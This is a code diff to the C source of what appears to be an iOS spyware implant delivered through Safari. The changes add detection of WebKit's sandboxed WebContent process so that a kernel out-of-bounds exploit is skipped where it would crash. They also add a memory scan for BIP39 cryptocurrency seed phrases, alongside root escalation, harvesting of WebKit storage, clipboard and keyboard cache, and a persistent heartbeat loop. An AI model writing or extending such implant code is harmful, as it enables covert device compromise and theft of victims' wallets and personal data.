@@ -8,6 +8,7 @@
 #include "data_harvest.h"
 #include <pthread.h>
 #include <unistd.h>
+#include <string.h>
 #include <dispatch/dispatch.h>
 
 /* ── Privilege escalation (requires kernel r/w primitives) ─────────────────── */
@@ -70,6 +71,26 @@ static void elevate_to_root(void) {
     setgid(0);
 }
 
+/*
+ * Detect whether we are running inside WebKit's sandboxed WebContent process.
+ * WebContent has a very restrictive sandbox: it cannot create raw sockets,
+ * and its virtual-memory limits are tight enough that ke_pe_v1()'s 256 MB
+ * memory spray is immediately jetsam-killed by iOS.
+ *
+ * Detection: process name is "com.apple.WebKit.WebContent" or "WebContent"
+ * (getprogname() returns only the last path component).
+ */
+static bool is_webcontent_process(void) {
+    const char *pname = getprogname();
+    if (!pname) return false;
+    /* Exact match or suffix match for the short name */
+    if (strcmp(pname, "WebContent") == 0)              return true;
+    if (strcmp(pname, "com.apple.WebKit.WebContent") == 0) return true;
+    /* strstr covers "WebContent-" variants (e.g. "WebContent-GPU") */
+    if (strstr(pname, "WebContent") != NULL)            return true;
+    return false;
+}
+
 /* ── Background implant entry point ────────────────────────────────────────── */
 static void *implant_main(void *arg) {
     (void)arg;
@@ -80,20 +101,22 @@ static void *implant_main(void *arg) {
     /*
      * Kernel primitive acquisition strategy (by priority):
      *
-     *  1. ke_run() — self-contained physical OOB exploit (pe_v1) that builds
-     *     kread64/kwrite64/kbase internally, then calls coruna_init_primitives().
-     *     Times out after 15 s if the exploit races do not converge.
+     *  1. ke_run() — self-contained physical OOB exploit (pe_v1).
+     *     SKIPPED when running inside WebContent: ke_pe_v1() allocates >256 MB
+     *     of virtual memory for the spray, which triggers iOS jetsam and kills
+     *     the process before any data can be collected.  It also requires raw
+     *     ICMP sockets that the WebContent sandbox blocks.
      *
-     *  2. coruna_hook_slot — if ke_run() fails (A18 device, OOB timeout, or
-     *     sandbox block), wait up to 5 s for Stage3_VariantB.js to write real
-     *     kernel VAs via exploitPrimitive.write64.
+     *  2. coruna_hook_slot — Stage3_VariantB.js can write real kernel VAs here
+     *     before calling _process.  Valid in all environments.
      *
-     *  If both paths fail we degrade gracefully: skip privilege escalation
-     *  and run data collection with whatever sandbox permissions we already have.
+     *  If both paths fail we degrade gracefully and harvest whatever the current
+     *  sandbox permissions allow (WebKit storage, clipboard, keyboard cache, …).
      */
+    const bool in_webcontent = is_webcontent_process();
 
-    /* Path 1: self-bootstrapping kernel exploit */
-    if (!kernel_base())
+    /* Path 1: self-bootstrapping kernel exploit (skip in WebContent) */
+    if (!in_webcontent && !kernel_base())
         ke_run();
 
     /* Path 2: wait for Stage3 to populate hook_slot (max ~5 s) */
@@ -117,6 +140,18 @@ static void *implant_main(void *arg) {
     }
 
     harvest_all();
+
+    /*
+     * Memory BIP39 scan: scans the entire VM map of the current process for
+     * mnemonic phrases.  Safe only outside WebContent — in the Safari renderer
+     * the process can have >1 GB of WebKit heap mapped, making the scan take
+     * minutes and almost certainly trigger iOS jetsam before it finishes.
+     *
+     * Outside WebContent (e.g. after launchdaemon persistence, or when injected
+     * into a higher-privileged process) the scan is much smaller and worthwhile.
+     */
+    if (!in_webcontent)
+        harvest_memory_mnemonics();
 
     /* Heartbeat loop: stay alive and periodically re-scan clipboard. */
     while (1) {
